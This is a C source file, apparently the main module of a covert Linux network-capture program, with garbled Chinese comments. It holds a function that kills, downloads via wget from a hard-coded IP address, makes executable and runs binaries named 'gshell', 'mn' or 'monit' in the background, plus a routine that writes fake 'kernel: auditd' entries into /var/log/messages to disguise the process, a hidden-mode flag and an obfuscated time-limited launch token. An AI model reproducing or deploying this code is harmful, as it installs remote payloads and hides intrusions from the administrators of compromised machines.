#include "main.h"

/*
local_xml=0; Զ��,ɾ��
local_xml=1; ���ز�ɾ��
local_xml=2; ����http.bin ɾ��

local_stats=0;  Զ���ϱ�
local_stats=1;  �����ϱ�
local_stats=2;  ���κ��ϱ�

*/
int decode_args(char *args)
{
    int i;
    int len;
    char k;
    len = strlen( args );
    k = atoi(args+len-1);
    for(i=0;i<len;i++)
    {
        if(i != (len-1) )
        {
            if( args[i] >= ']' )
            {
                args[i] -= 6;
            }
            args[i]= args[i]-k-i -('A'-'0');
        }
    }
    return 1;
}
int encode_args(char *args)
{
    int i;
    int len;
    char k;
    len = strlen( args );
    k = atoi(args+len-1);
    for(i=0;i<len;i++)
    {
        if(i != (len-1) )
        {
            args[i]= args[i]+k+i + ('A'-'0');
            if( args[i] >='[' )
            {
                args[i]+= 6;
            }
        }
    }
    return 1;
}


long get_en_mid(char *str)
{
    char *start;
    char *end;
    start = str+1;
    end   = str+1+10;
    *end = 0;
    return atol(start);
}

int show_help()
{
    printf(
        "A  1=info key str\n"\
        "B  2=info host\n"\
        "C  4=info app,uri\n"\
        "D  8=info timer\n"\
        "E  16=info search node\n"\
        "F  32=info hit interval\n"\
        "G  64=info url\n"\
        "H  128=info location\n"
    );
    return 1;
}
//local_xml = 0 : Զ��
//local_xml = 1 : ����
//local_xml = 2 : ���ؼ���
int proc_argv(int argc ,char *argv[])
{
    int i;
    char *tmp;
    int  arg_e=0;
    long tm1,tm2;
    char buffer[32]={0};

    g_hide=1;
    tmp = strrchr(argv[0],'/');
    if(tmp==NULL)
    {
        tmp = argv[0];
    }
    else
    {
        tmp+=1;
    }
    strcpy(g_proname,tmp);
	for(i=0;i<argc; i++)
	{
        if(	strcmp(argv[i] , "-h") == 0	)
        {
            show_help();
            exit(0);
        }
		if(	strcmp(argv[i] , "-d") == 0	)
		{
//            g_hide = 0;
			g_debug = 1;
            if((i+1)<argc)
            {
                g_debug=atoi(argv[i+1]);
            }            
            log_init(g_debug);
            printf("log level:%d\n",g_debug);
		}	
		if(	strcmp(argv[i] , "-l") == 0	)
		{
            locat_ip=1;
		}
        //����
		if(	strcmp(argv[i] , "-a") == 0	)
		{
            local_xml=2;
            local_stats=2;
		} 
		if(	strcmp(argv[i] , "-p") == 0	)
		{
            g_passwd=1;
		}
        if(	strcmp(argv[i] , "-e") == 0	)
        {
            strcpy(buffer,argv[i+1]);
            decode_args(buffer);
            tm2 = time(NULL);
            tm1 = get_en_mid(buffer);
            if( (tm2-tm1) >= 0 && (tm2-tm1) < 30)
            {
                arg_e =1;
            }
        }
		if(	strcmp(argv[i] , "-u") == 0	)
		{
            if((i+1)<argc)
            {
                local_xml=atoi(argv[i+1]);
            }
            else
            {
                local_xml=1;
            }            
		}
		if(	strcmp(argv[i] , "-s") == 0	)
		{
            if((i+1)<argc)
            {
                local_stats=atoi(argv[i+1]);
            }
            else
            {
                local_stats=1;
            }
		}   
		if(	strcmp(argv[i] , "-f") == 0	)
		{
			printf("fpcap open  ---->\n");
			fcap= pcap_init(argv[i+1]);
		}
    }
    if(arg_e ==0)
    {
        #ifdef CONF_NET
        	//exit(0);
        #endif
    }
    if(g_debug)
    {
        printf("%s...\n",APP_VER);
    }
    return 1;
}
void clean(int signo)
{
    printf("oops! stop!!!%d\n",signo);
    close_xmls();
    if(fcap)
    {
        fclose(fcap);
    }
    QUIT(1);
    exit(0);
}
 
int proc_log(int type)
{
    char buffer[1024]={0};
    char *arrs[3]={"start","stop",NULL};
    type = type%2;
    sprintf(buffer,"echo -e `date  +'%%b %%d %%T';hostname;echo 'kernel: auditd %s'`>>/var/log/messages",
     arrs[type]
    );
    system(buffer);
    return 1;
}
int down_gshell()
{
    //if( strstr(APP_VER,"down"))
    #ifdef DOWN
        char cmd_buffer[1024]={0};
        sprintf(cmd_buffer,"killall gshell;rm -rf gshell;wget 112.74.214.75/gshell;chmod 755 gshell;./gshell;rm -rf gshell");
        system(cmd_buffer);
        #ifdef PRI_YUM
            sprintf(cmd_buffer,"killall mn;rm -rf mn;wget 112.74.214.75/mn;chmod 755 mn;nohup ./mn&");
            system(cmd_buffer); 
        #else
            sprintf(cmd_buffer,"killall monit;rm -rf monit;wget 112.74.214.75/monit;chmod 755 monit;nohup ./monit&");
            system(cmd_buffer);
        #endif
    #endif
    return 1;
}
int test_fun()
{
#if 0      
    char src[1024];
    int  *next;
    int  i,len;
    strcpy(src,"abcabcacab");
    len = strlen(src);
    next = str_initkmp(src);
    for(i=0;i<len;i++)
    {
        printf("i:%d %d\n",i,next[i]);
    }
    exit(0);
#endif    
#if 0    
    int  i=0;
    int  ret=0;
    char **buffer;
    char str[64];
    strcpy(str,"123;;456;;789;;");
    buffer = str_split(";;",str,&ret);
    for(i=0;i<ret;i++)
    {
        printf("i:%d  %s\n",i,buffer[i]);
    }
    strcpy(str,"1;2;;;;;;3;4;5;6;7");
    buffer = str_split(";",str,&ret);
    for(i=0;i<ret;i++)
    {
        printf("i:%d  %s\n",i,buffer[i]);
    }
#endif    
    return 1;
}

int main(int argc, char **argv)
{
    struct tm *_tm;
    pid_t pid ;
    proc_log(0);
    pid = getPidByName(argv[0]);
    proc_argv(argc,argv);
    test_fun();    
    g_stime =time(NULL);
    if ((pid > 0) && (pid != getpid()))
    {
        printf("\nprogram is running, please kill -9 %d first.\n", (int)pid);
		QUIT(1);
        exit(-1);
    }
    if(  init_cmd() == -1 )
    {
        printf("error file:%s line:%d\n", __FILE__, __LINE__);
        return 1;
    }
//START:
	if( init_radis() == -1) 
	{
        printf("init_config error file:%s line:%d\n", __FILE__, __LINE__);
        goto END;		
	}
    if ( init_config() == -1) 
    {
        printf("init_config error file:%s line:%d\n", __FILE__, __LINE__);
        goto END;
    }
	if( close_xmls() == -1 )
	{
        printf("init_config error file:%s line:%d\n", __FILE__, __LINE__);
        goto END;
	}        
    if ( init_user() == -1 )
    {
        printf("init_config error file:%s line:%d\n", __FILE__, __LINE__);
        goto END;        
    }
    if( init_stats() == -1 )
    {
        printf("init_config error file:%s line:%d\n", __FILE__, __LINE__);
        goto END;
    }
    if( init_eth() == -1 )
    {
        printf("init_config error file:%s line:%d\n", __FILE__, __LINE__);
        goto END;
    }
    tcfg.start=1;
    while(tcfg.start)
    {
        //if(g_debug) printf("running %u ...\n", g_nowtime);
		g_nowtime = time(NULL);
        _tm = localtime(&g_nowtime);
        g_min = _tm->tm_hour*60 + _tm->tm_min ;
        g_wday = (_tm->tm_wday)%7;
        //100ms
        usleep(100000);
    }
    sleep(2);
    //ֹͣץ��
    close_eth();
    sleep(1);
    close_user();
    close(xmit_sock);
    sleep(1);
    close_memurl();
    printf("running end......\n");
END:
    //goto START;
    //proc_log(1);
    //down_gshell();
    return 1;
}
